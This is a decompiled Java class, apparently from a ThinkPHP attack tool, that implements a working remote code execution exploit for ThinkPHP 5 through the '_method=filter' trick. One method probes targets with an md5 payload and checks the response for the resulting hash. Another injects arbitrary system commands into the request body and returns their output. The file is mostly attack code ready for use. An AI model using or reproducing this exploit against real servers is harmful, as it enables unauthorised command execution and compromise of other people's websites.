/*    */ package dylan.exp;
/*    */ 
/*    */ import dylan.model.BaseExp;
/*    */ import dylan.model.Response;
/*    */ import dylan.tools.HttpTool;
/*    */ import dylan.tools.Util;
/*    */ import java.util.HashMap;
/*    */ 
/*    */ public class tp5_method_filter_code_exec
/*    */   implements BaseExp {
/* 11 */   private String results = "";
/* 12 */   private final HashMap<String, String> property = new HashMap<>();
/*    */ 
/*    */   
/*    */   public String vulCheck(String url) {
/* 16 */     url = url + "/public/index.php";
/* 17 */     String payload = "c=var_dump&f=md5(2333)&_method=filter";
/* 18 */     Response response = HttpTool.post(url, payload, this.property);
/* 19 */     if (response.getText().contains("f7e0b956540676a129760a3eae309294")) {
/* 20 */       this.results = "[+] 目标存在" + getClass().getSimpleName() + "漏洞";
/* 21 */       return this.results;
/*    */     } 
/* 23 */     if (response.getError() != null) {
/* 24 */       this.results = "[-] 检测漏洞" + getClass().getSimpleName() + "失败， " + response.getError();
/* 25 */       return this.results;
/*    */     } 
/* 27 */     this.results = "[-] 目标不存在" + getClass().getSimpleName() + "漏洞";
/*    */     
/* 29 */     return this.results;
/*    */   }
/*    */ 
/*    */   
/*    */   public String cmdExec(String url, String cmd) {
/* 34 */     url = url + "/public/index.php";
/* 35 */     String payload = "c=system&f=" + cmd + "&_method=filter";
/* 36 */     this.property.put("Content-type", "application/x-www-form-urlencoded");
/* 37 */     Response response = HttpTool.post(url, payload, this.property);
/* 38 */     if (response.getError() == null) {
/* 39 */       this.results = Util.regReplace(response.getText());
/*    */     } else {
/* 41 */       this.results = response.getError();
/*    */     } 
/* 43 */     return this.results;
/*    */   }
/*    */ 
/*    */   
/*    */   public String getShell(String url, String fileName, String content) {
/* 48 */     return null;
/*    */   }
/*    */ }


/* Location:              C:\Users\zyh\Desktop\ThinkPHP.V2.3.by蓝鲸.jar!\dylan\exp\tp5_method_filter_code_exec.class
 * Java compiler version: 8 (52.0)
 * JD-Core Version:       1.1.3
 */